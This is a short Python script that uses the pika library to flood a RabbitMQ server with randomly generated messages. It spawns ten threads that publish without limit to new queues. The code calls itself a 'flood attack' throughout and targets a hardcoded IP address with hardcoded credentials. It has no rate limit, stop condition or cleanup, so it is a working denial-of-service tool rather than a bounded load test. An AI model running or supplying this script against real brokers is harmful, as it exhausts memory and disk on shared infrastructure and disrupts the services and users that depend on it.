import pika
import json
import time
import random
import threading
import logging
from datetime import datetime, UTC

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s'
)
logger = logging.getLogger(__name__)

class FloodPublisher:
    def __init__(self, host='localhost', threads=5):
        self.host = host
        self.num_threads = threads
        self.message_count = 0
        self.connection_params = pika.ConnectionParameters(
            host=self.host,
            port=5672,
            credentials=pika.PlainCredentials('myapp', 'mypassword')
        )

    def generate_message(self):
        """Generate a message with random payload."""
        return {
            'id': f'MSG_{random.randint(1, 1000000)}',
            'timestamp': datetime.now(UTC).isoformat(),
            'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=1000)),
            'payload': [random.random() for _ in range(100)]
        }

    def flood_messages(self, thread_id):
        """Continuously send messages as fast as possible."""
        try:
            connection = pika.BlockingConnection(self.connection_params)
            channel = connection.channel()
            
            # Declare a queue for flooding
            queue_name = f'flood_queue_{thread_id}'
            channel.queue_declare(queue=queue_name)

            while True:
                message = self.generate_message()
                channel.basic_publish(
                    exchange='',
                    routing_key=queue_name,
                    body=json.dumps(message)
                )
                self.message_count += 1
                
                if self.message_count % 1000 == 0:
                    logger.info(f"Thread {thread_id} sent {self.message_count} messages")

        except Exception as e:
            logger.error(f"Thread {thread_id} error: {e}")
        finally:
            try:
                connection.close()
            except:
                pass

    def start_attack(self):
        """Start multiple threads to flood the server."""
        logger.info(f"Starting flood attack with {self.num_threads} threads")
        threads = []

        try:
            for i in range(self.num_threads):
                thread = threading.Thread(target=self.flood_messages, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
                logger.info(f"Started attack thread {i}")

            # Keep main thread running and show statistics
            while True:
                time.sleep(1)
                logger.info(f"Total messages sent: {self.message_count}")

        except KeyboardInterrupt:
            logger.info("Stopping flood attack")
        finally:
            for thread in threads:
                thread.join(timeout=1.0)

if __name__ == "__main__":
    # Change the host to your RabbitMQ server IP
    flooder = FloodPublisher(host='10.0.24.198', threads=10)
    flooder.start_attack()
